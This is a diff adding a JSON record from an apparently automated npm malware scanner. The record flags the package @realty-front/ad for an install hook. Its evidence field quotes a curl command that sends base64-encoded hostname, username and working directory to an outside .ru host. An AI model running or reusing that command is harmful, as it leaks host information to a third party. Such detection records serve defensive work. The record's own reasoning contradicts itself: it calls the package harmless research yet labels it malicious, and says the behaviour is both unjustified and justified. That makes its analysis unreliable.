@@ -1,0 +1,53 @@
+{
+  "package_name": "@realty-front/ad",
+  "version": "1.13.1",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains an install hook that may execute remote code at install time.",
+        "details": "The install hook command listed in the package metadata above executes a curl command with a payload that may indicate a remote code execution attempt.",
+        "confidence": 0.92,
+        "evidence_commands": [
+          "curl -H \"Package:@realty-front/ad\" -H \"Version:1.13.1\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d \"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "The package contains an install hook that may execute remote code at install time. The install hook command listed in the package metadata above executes a curl command with a payload that may indicate a remote code execution attempt.",
+      "chain_score": 0.34
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package's stated purpose does not match the detected behaviors. The package is created for security research purposes and does not contain any useful malicious code.",
+      "legitimacy_score": 0.34
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.34,
+      "explanation": "The detected behaviors form a coherent attack chain and they are justified by the package's stated purpose."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T09:56:37.605357"
+}
